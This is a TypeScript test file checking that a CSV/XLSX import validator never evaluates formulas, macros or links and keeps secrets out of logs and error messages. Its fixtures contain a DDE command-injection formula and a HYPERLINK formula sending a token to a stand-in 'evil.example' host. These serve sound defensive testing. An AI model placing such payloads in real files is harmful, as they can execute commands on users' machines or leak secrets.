/** @vitest-environment node */

import { afterEach, describe, expect, it, vi } from "vitest";

import {
  TabularValidationError,
  validateTabularImport,
} from "@/lib/orgs/tabular-validation";
import {
  CSV_MIME,
  XLSX_MIME,
  csvBytes,
  makeXlsx,
  sampleCsv,
} from "@/tests/helpers/tabular-fixtures";

const SECRET = "SECRET_TOKEN_VALUE_42";
const EVIL_URL = "https://evil.example/steal?token=SECRET_TOKEN_VALUE_42";

afterEach(() => {
  vi.restoreAllMocks();
});

describe("tabular validation security", () => {
  it("never evaluates formulas, macros, or external links", async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);

    await expect(
      validateTabularImport({
        bytes: await makeXlsx({
          sheets: [{ name: "Sheet1", rows: [["Name"], ["A"]] }],
          macroEnabled: true,
        }),
        filename: "macro.xlsx",
        declaredMimeType: XLSX_MIME,
      }),
    ).rejects.toMatchObject({ code: "macros" });

    const formulaCsv = await validateTabularImport({
      bytes: csvBytes(`Name,Payload\nWidget,=cmd|' /C calc'!A0\n`),
      filename: "inject.csv",
      declaredMimeType: CSV_MIME,
    });
    expect(formulaCsv.outcome).toBe("needs_attention");
    expect(formulaCsv.previewRows[0]?.cells[1]).toBe("=cmd|' /C calc'!A0");
    expect(formulaCsv.issues.some((item) => item.code === "formula_like")).toBe(
      true,
    );
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("keeps safe errors and logs free of file bytes, formulas, URLs, and secrets", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => undefined);
    const info = vi.spyOn(console, "info").mockImplementation(() => undefined);
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const error = vi
      .spyOn(console, "error")
      .mockImplementation(() => undefined);

    const csv = await validateTabularImport({
      bytes: csvBytes(`Name,Secret\nCustomer,${SECRET}\n=1+1,${EVIL_URL}\n`),
      filename: "secrets.csv",
      declaredMimeType: CSV_MIME,
    });
    expect(csv.issues.every((item) => !("message" in item))).toBe(true);
    expect(JSON.stringify(csv.issues)).not.toContain(SECRET);
    expect(JSON.stringify(csv.issues)).not.toContain(EVIL_URL);
    expect(JSON.stringify(csv.issues)).not.toContain("=1+1");

    try {
      await validateTabularImport({
        bytes: csvBytes(`Name\n"${SECRET}`),
        filename: "broken-secret.csv",
        declaredMimeType: CSV_MIME,
      });
    } catch (caught) {
      expect(caught).toBeInstanceOf(TabularValidationError);
      expect((caught as Error).message).not.toContain(SECRET);
      expect(String(caught)).not.toContain(SECRET);
    }

    const xlsx = await validateTabularImport({
      bytes: await makeXlsx({
        sheets: [
          {
            name: "Sheet1",
            rows: [
              ["Name", "Link"],
              ["Widget", SECRET],
            ],
            formulas: [
              {
                row: 2,
                column: 2,
                formula: `HYPERLINK("${EVIL_URL}","${SECRET}")`,
                cached: SECRET,
              },
            ],
            hyperlinks: [{ ref: "B2", url: EVIL_URL }],
          },
        ],
      }),
      filename: "secrets.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(JSON.stringify(xlsx.issues)).not.toContain(SECRET);
    expect(JSON.stringify(xlsx.issues)).not.toContain("HYPERLINK");
    expect(JSON.stringify(xlsx.issues)).not.toContain(EVIL_URL);
    expect(xlsx.previewRows[0]?.cells[1]).toBe(SECRET);

    for (const spy of [log, info, warn, error]) {
      expect(spy.mock.calls.flat().map(String).join("\n")).not.toContain(
        SECRET,
      );
      expect(spy.mock.calls.flat().map(String).join("\n")).not.toContain(
        EVIL_URL,
      );
    }
  });

  it("does not leak sensitive CSV content when a valid file parses", async () => {
    const result = await validateTabularImport({
      bytes: csvBytes(sampleCsv()),
      filename: "ok.csv",
      declaredMimeType: CSV_MIME,
    });
    expect(result.issues).toEqual([]);
    expect(JSON.stringify(result.issues)).not.toContain("Widget");
  });
});
